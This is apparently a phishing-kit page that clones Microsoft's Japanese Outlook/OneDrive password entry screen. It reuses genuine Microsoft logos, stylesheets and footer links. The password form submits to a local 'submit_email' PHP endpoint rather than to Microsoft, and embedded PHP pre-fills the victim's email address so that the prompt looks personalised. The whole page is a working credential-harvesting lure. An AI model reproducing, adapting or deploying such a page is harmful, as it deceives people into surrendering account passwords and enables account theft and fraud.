<html dir="ltr" lang="JA-JP">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Outlook.com - 無料の個人用メール</title>
    <meta name="robots" content="none">
    <meta name="description" content="パスワードで保護されたオンラインのファイル保存サービスです。いつでもどこからでも利用できます。">
    <meta name="PageID" content="i5030">
    <meta name="SiteID" content="250206">
    <meta name="ReqLC" content="1041">
    <meta name="LocLC" content="1041">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.28910.3/images/favicon.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000/Converged_v21041_pX57w6YnWiqTo95swppIBg2.css">
    <style type="text/css"></style>
    <style type="text/css">
    body {
        display: none;
    }
    </style>
    <style type="text/css">
    body {
        display: block !important;
    }
    </style>
    <noscript>
        <style type="text/css">
        body {
            display: block !important;
        }
        </style>
    </noscript>
    <style>
    ._3emE9--dark-theme .-S-tR--ff-downloader {
        background: rgba(30, 30, 30, .93);
        border: 1px solid rgba(82, 82, 82, .54);
        box-shadow: 0 4px 7px rgba(30, 30, 30, .55);
        color: #fff
    }
    
    ._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn {
        background: #3d4b52
    }
    
    ._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover {
        background: #131415
    }
    
    ._3emE9--dark-theme .-S-tR--ff-downloader ._10vpG--footer {
        background: rgba(30, 30, 30, .93)
    }
    
    ._2mDEx--white-theme .-S-tR--ff-downloader {
        background: #fff;
        border: 1px solid rgba(82, 82, 82, .54);
        box-shadow: 0 4px 7px rgba(30, 30, 30, .55);
        color: #314c75
    }
    
    ._2mDEx--white-theme .-S-tR--ff-downloader ._6_Mtt--header {
        font-weight: 700
    }
    
    ._2mDEx--white-theme .-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice {
        border: 0;
        color: rgba(0, 0, 0, .88)
    }
    
    ._2mDEx--white-theme .-S-tR--ff-downloader ._10vpG--footer {
        background: #fff
    }
    
    .-S-tR--ff-downloader {
        display: block;
        overflow: hidden;
        position: fixed;
        bottom: 20px;
        right: 7.1%;
        width: 330px;
        height: 180px;
        background: rgba(30, 30, 30, .93);
        border-radius: 2px;
        color: #fff;
        z-index: 99999999;
        border: 1px solid rgba(82, 82, 82, .54);
        box-shadow: 0 4px 7px rgba(30, 30, 30, .55);
        transition: .5s
    }
    
    .-S-tR--ff-downloader._3M7UQ--minimize {
        height: 62px
    }
    
    .-S-tR--ff-downloader._3M7UQ--minimize .nxuu4--file-info,
    .-S-tR--ff-downloader._3M7UQ--minimize ._6_Mtt--header {
        display: none
    }
    
    .-S-tR--ff-downloader ._6_Mtt--header {
        padding: 10px;
        font-size: 17px;
        font-family: sans-serif
    }
    
    .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn {
        float: right;
        background: #f1ecec;
        height: 20px;
        width: 20px;
        text-align: center;
        padding: 2px;
        margin-top: -10px;
        cursor: pointer
    }
    
    .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover {
        background: #e2dede
    }
    
    .-S-tR--ff-downloader ._13XQ2--error {
        color: red;
        padding: 10px;
        font-size: 12px;
        line-height: 19px
    }
    
    .-S-tR--ff-downloader ._2dFLA--container {
        position: relative;
        height: 100%
    }
    
    .-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info {
        padding: 6px 15px 0;
        font-family: sans-serif
    }
    
    .-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info div {
        margin-bottom: 5px;
        width: 100%;
        overflow: hidden
    }
    
    .-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice {
        margin-top: 21px;
        font-size: 11px
    }
    
    .-S-tR--ff-downloader ._10vpG--footer {
        width: 100%;
        bottom: 0;
        position: absolute;
        font-weight: 700
    }
    
    .-S-tR--ff-downloader ._10vpG--footer ._2V73d--loader {
        animation: n0BD1--rotation 3.5s linear forwards;
        position: absolute;
        top: -120px;
        left: calc(50% - 35px);
        border-radius: 50%;
        border: 5px solid #fff;
        border-top-color: #a29bfe;
        height: 70px;
        width: 70px;
        display: flex;
        justify-content: center;
        align-items: center
    }
    
    .-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar {
        width: 100%;
        height: 18px;
        background: #dfe6e9;
        border-radius: 5px
    }
    
    .-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar ._1FVu9--progress-bar {
        height: 100%;
        background: #8bc34a;
        border-radius: 5px
    }
    
    .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status {
        margin-top: 10px
    }
    
    .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1XilH--state {
        float: left;
        font-size: .9em;
        letter-spacing: 1pt;
        text-transform: uppercase;
        width: 100px;
        height: 20px;
        position: relative
    }
    
    .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1jiaj--percentage {
        float: right
    }
    </style>

</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
        <!--  -->
        <!--  -->
        <div data-bind="if: activeDialog"></div>
         <form name="f1" id="i0281" validate="validate" spellcheck="false" method="post" target="_top" autocomplete="off" action="submit_email?session=<?php echo $key;?>">
            <!-- ko if: svr.C2 -->
            <!-- /ko -->
            <!-- ko withProperties: { '$loginPage': $data } -->
            <div data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.F,
            showFooterLinks: true,
            useWizardBehavior: svr.Bo,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
                <!--  -->
                <!-- ko ifnot: useLayoutTemplates -->
                <!-- /ko -->
                <!-- ko if: useLayoutTemplates -->
                <!-- ko withProperties: { '$page': $parent } -->
                <!-- ko ifnot: isVerticalSplitTemplate -->
                <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr } }">
                    <!--  -->
                    <div data-bind="component: { name: 'background-image-control',
    publicMethods: $page.backgroundControlMethods }">
                        <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                            <!-- ko if: smallImageUrl -->
                            <!-- /ko -->
                            <!-- ko if: backgroundImageUrl -->
                            <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
                            <!-- ko if: useImageMask -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </div>
                    </div>
                    <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
                        <!-- ko if: showHeader -->
                        <!-- /ko -->
                        <div class="template-section main-section">
                            <div class="middle" data-bind="css: { 'has-header': showHeader }">
                                <!-- ko if: $page.backgroundLogoUrl() && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                                <!-- /ko -->
                                <!-- ko if: svr.Cp && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hidePageLevelTitleAndDesc')) -->
                                <!-- /ko -->
                                <div id="lightbox" data-bind="
                animationEnd: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().view_onAnimationEnd,
                externalCss: { 'sign-in-box': true },
                css: {
                    'app': $page.backgroundLogoUrl(),
                    'wide': $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': $page.fadeInLightBox,
                    'has-popup': $page.showFedCredButtons() || $page.newSession(),
                    'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                    'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                                    <!-- ko template: { nodes: $parentContext.$componentTemplateNodes, data: $page } -->
                                    <!-- ko if: svr.BE -->
                                    <!-- /ko -->
                                    <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bV &amp;&amp; showLightboxProgress() }"></div>
                                    <!-- ko if: showLightboxProgress -->
                                    <!-- /ko -->
                                    <div class="win-scroll">
                                        <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                                        <div data-bind="component: { name: 'logo-control',
                params: {
                    isChinaDc: svr.fIsChinaDc,
                    bannerLogoUrl: bannerLogoUrl() } }">
                                            <!--  -->
                                            <!-- ko if: bannerLogoUrl -->
                                            <!-- /ko -->
                                            <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                                            <!-- ko component: 'accessible-image-control' -->
                                            <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                            <!-- /ko -->
                                            <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                                            <!-- /ko -->
                                            <!-- /ko -->
                                            <!-- /ko -->
                                            <!-- /ko -->
                                        </div>
                                        <!-- /ko -->
                                        <!-- ko if: svr.cR && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
                                        <!-- /ko -->
                                        <!-- ko if: asyncInitReady -->
                                        <div role="main" data-bind="component: { name: 'pagination-control',
                publicMethods: paginationControlMethods,
                params: {
                    enableCssAnimation: svr.ao,
                    disableAnimationIfAnimationEndUnsupported: svr.bZ,
                    initialViewId: initialViewId,
                    currentViewId: currentViewId,
                    initialSharedData: initialSharedData,
                    initialError: $loginPage.getServerError() },
                event: {
                    cancel: paginationControl_onCancel,
                    loadView: view_onLoadView,
                    showView: view_onShow,
                    setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                    animationStateChange: paginationControl_onAnimationStateChange } }">
                                            <!--  -->
                                            <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                                                <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.J) -->
                                                <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
                                                    <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.bo,
                displayName: sharedData.displayName || svr.J,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }">
                                                        <!--  -->
                                                        <div class="identityBanner">
                                                            <!-- ko if: isBackButtonVisible -->
                                                            <!-- /ko -->
                                                            <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $_SESSION['email'];?>"><?php echo $_SESSION['email'];?></div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <!-- /ko -->
                                                <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.J),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">
                                                    <!-- ko foreach: views -->
                                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                    <!-- /ko -->
                                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                    <!-- /ko -->
                                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                    <!-- ko template: { nodes: [$data], data: $parent } -->
                                                    <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                    params: {
                        serverData: svr,
                        serverError: initialError,
                        isInitialView: isInitialState,
                        username: sharedData.username,
                        displayName: sharedData.displayName,
                        hipRequiredForUsername: sharedData.hipRequiredForUsername,
                        passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                        availableCreds: sharedData.availableCreds,
                        evictedCreds: sharedData.evictedCreds,
                        useEvictedCredentials: sharedData.useEvictedCredentials,
                        showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                        flowToken: sharedData.flowToken,
                        defaultKmsiValue: svr.Ag === 1,
                        userTenantBranding: sharedData.userTenantBranding,
                        sessions: sharedData.sessions,
                        callMetadata: sharedData.callMetadata },
                    event: {
                        updateFlowToken: $loginPage.view_onUpdateFlowToken,
                        submitReady: $loginPage.view_onSubmitReady,
                        redirect: $loginPage.view_onRedirect,
                        resetPassword: $loginPage.passwordView_onResetPassword,
                        setBackButtonState: view_onSetIdentityBackButtonState,
                        setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                                        <!--  -->
                                                        <!--  -->
                                                       
                                                        <input type="hidden" name="login" data-bind="value: unsafe_username" value="<?php echo $_SESSION['email'];?>">
                                                        <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                                                        <input type="hidden" name="type" data-bind="value: svr.Bo ? 20 : 11" value="11">
                                                        <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
                                                        <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
                                                        <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
                                                        <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
                                                        <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
                                                        <div id="loginHeader" class="row title ext-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title'], externalCss: { 'title': true }">パスワードの入力</div>
                                                        <!-- ko if: showCredViewBrandingDesc -->
                                                        <!-- /ko -->
                                                        <!-- ko if: unsafe_pageDescription -->
                                                        <!-- /ko -->
                                                        <div class="row">
                                                            <div class="form-group col-md-24">
                                                                <div role="alert" aria-live="assertive">
                                                                    <!-- ko if: passwordTextbox.error -->
                                                                    <!-- /ko -->
                                                                </div>
                                                                <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
                                                                    <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                                    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                                                                    <input type="hidden" name="email" value="<?php echo $_SESSION['email'];?>">
                                                                    <input name="password" required="required" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    'loginHeader',
                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader  " placeholder="パスワード" aria-label="<?php echo $_SESSION['email'];?> のパスワードを入力します" tabindex="0">
                                                                    <!-- ko if: svr.Cx && showPassword() -->
                                                                    <!-- /ko -->
                                                                    <!-- /ko -->
                                                                    <!-- /ko -->
                                                                    <!-- ko ifnot: usePlaceholderAttribute -->
                                                                    <!-- /ko -->
                                                                </div>
                                                                <!-- ko if: svr.Cx -->
                                                                <!-- /ko -->
                                                            </div>
                                                        </div>
                                                        <!-- ko if: shouldHipInit -->
                                                        <!-- /ko -->
                                                        <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                                            <div>
                                                                <!-- ko if: svr.Cq -->
                                                                <!-- /ko -->
                                                                <!-- ko if: svr.a7 !== false && !svr.Cq && !tenantBranding.KeepMeSignedInDisabled -->
                                                                <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView">
                                                                    <label id="idLbl_PWD_KMSI_Cb">
                                                                        <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="サインインしたままにする"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">サインインしたままにする</span> </label>
                                                                </div>
                                                                <!-- /ko -->
                                                                <div class="row">
                                                                    <div class="col-md-24">
                                                                        <div class="text-13">
                                                                            <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1614011566%26rver%3d7.3.6962.0%26wp%3dMBI_SSL_SHARED%26wreply%3dhttps:%252F%252Fonedrive.live.com%253Fgologin%253D1%2526mkt%253Dja-JP%26lc%3d1041%26id%3d250206%26cbcxt%3dsky%26mkt%3dja-JP%26lw%3d1%26fl%3deasi2%26username%3dhard-hacx%2540hotmail.co.id%26contextid%3d8A56232E18716DB0%26bk%3d1614011594&amp;id=250206&amp;uiflavor=web&amp;uaid=a0dd489069654e0ea291edcc2950385a&amp;mkt=JA-JP&amp;lc=1041&amp;bk=1614011594" data-bind="
                            text: str['CT_PWD_STR_ForgotPwdLink_Text'],
                            href: accessRecoveryLink || svr.T,
                            attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                            click: accessRecoveryLink ? null : resetPassword_onClick">パスワードを忘れた場合</a> </div>
                                                                            <!-- ko if: allowPhoneDisambiguation -->
                                                                            <!-- /ko -->
                                                                            <!-- ko ifnot: useEvictedCredentials -->
                                                                            <!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                redirect: onRedirect,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } -->
                                                                            <!--  -->
                                                                            <div class="form-group">
                                                                                <!-- ko if: showSwitchToCredPickerLink -->
                                                                                <!-- /ko -->
                                                                                <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
                                                                                <!-- /ko -->
                                                                                <!-- ko if: credentialCount === 0 && showForgotUsername -->
                                                                                <!-- /ko -->
                                                                            </div>
                                                                            <!-- ko if: credLinkError -->
                                                                            <!-- /ko -->
                                                                            <!-- /ko -->
                                                                            <!-- ko if: evictedCreds.length > 0 -->
                                                                            <!-- /ko -->
                                                                            <!-- /ko -->
                                                                            <!-- ko if: showChangeUserLink -->
                                                                            <div class="form-group"> <a id="i1668" href="#" data-bind="text: str['CT_FED_STR_ChangeUserLink_Text'], click: selectAccount_onClick">別の Microsoft アカウントでサインインします</a> </div>
                                                                            <!-- /ko -->
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="win-button-pin-bottom">
                                                                <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                                    <div data-bind="component: { name: 'footer-buttons-field',
                params: {
                    serverData: svr,
                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                    isPrimaryButtonEnabled: !isRequestPending(),
                    isPrimaryButtonVisible: svr.F,
                    isSecondaryButtonEnabled: true,
                    isSecondaryButtonVisible: false },
                event: {
                    primaryButtonClick: primaryButton_onClick } }">
                                                                        <div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">
                                                                            <!-- ko if: isSecondaryButtonVisible -->
                                                                            <!-- /ko -->
                                                                            <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
                                                                                <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                                <input type="submit" id="idSIButton9" data-bind="
            attr: primaryButtonAttributes,
            externalCss: {
                'button': true,
                'primary': true },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" class="button ext-button primary ext-primary" value="サインイン"> </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <!-- ko if: tenantBranding.BoilerPlateText -->
                                                        <!-- /ko -->
                                                    </div>
                                                   
                                                </div>
                                            </div>
                                        </div>
                                        <!-- /ko -->
                                    </div>
                                    
                                    </div>
                                    <!-- /ko -->
                                </div>
                                <!-- ko if: $page.showFedCredButtons -->
                                <!-- /ko -->
                                <!-- ko if: $page.newSession -->
                                <!-- /ko -->
                                <!-- ko if: $page.showDebugDetails -->
                                <!-- /ko -->
                                <!-- ko if: !svr.b5 && $page.paginationControlMethods() && $page.paginationControlMethods().hasInitialViewShown() -->
                                <div id="footer" role="contentinfo" data-bind="
                externalCss: {
                    'footer': true,
                    'has-background': !$page.useDefaultBackground(),
                    'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
                                    <div data-bind="component: { name: 'footer-control',
                    publicMethods: $page.footerMethods,
                    params: {
                        serverData: svr,
                        useDefaultBackground: $page.useDefaultBackground(),
                        hasDarkBackground: $page.backgroundLogoUrl(),
                        showLinks: true },
                    event: {
                        agreementClick: $page.footer_agreementClick,
                        showDebugDetails: $page.toggleDebugDetails_onClick } }">
                                        <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
                                        <div id="footerLinks" class="footerNode text-secondary">
                                            <!-- ko if: showFooter -->
                                            <!-- ko if: !hideTOU --><a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=JA-JP&amp;vv=1600&amp;uaid=a0dd489069654e0ea291edcc2950385a" class="footer-content ext-footer-content footer-item ext-footer-item">利用規約</a>
                                            <!-- /ko -->
                                            <!-- ko if: !hidePrivacy --><a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=JA-JP&amp;vv=1600&amp;uaid=a0dd489069654e0ea291edcc2950385a" class="footer-content ext-footer-content footer-item ext-footer-item">プライバシーと Cookie</a>
                                            <!-- /ko -->
                                            <!-- ko if: impressumLink -->
                                            <!-- /ko -->
                                            <!-- ko if: showIcpLicense -->
                                            <!-- /ko -->
                                            <!-- /ko -->
                                            <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --><a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="トラブルシューティング情報についてはここをクリックしてください" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a> </div>
                                        <!-- /ko -->
                                        <!-- ko if: svr.Cn && showLinks -->
                                        <!-- /ko -->
                                    </div>
                                </div>
                                <!-- /ko -->
                            </div>
                        </div>
                    </div>
                </div>
                <!-- /ko -->
                <!-- ko if: isVerticalSplitTemplate() && isVerticalSplitTemplateLoaded() -->
                <!-- /ko -->
                <!-- /ko -->
                <!-- /ko -->
            </div>
            <!-- /ko -->
        </form>
        <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>
        <!-- ko if: svr.aa -->
        <div id="idPartnerPL" data-bind="injectIframe: { url: svr.aa }">
            <iframe height="0" width="0" src="https://onedrive.live.com/preload?view=Folders.All&amp;id=250206&amp;mkt=JA-JP" style="display: none;"></iframe>
        </div>
        <!-- /ko -->
    </div>
</body>

</html>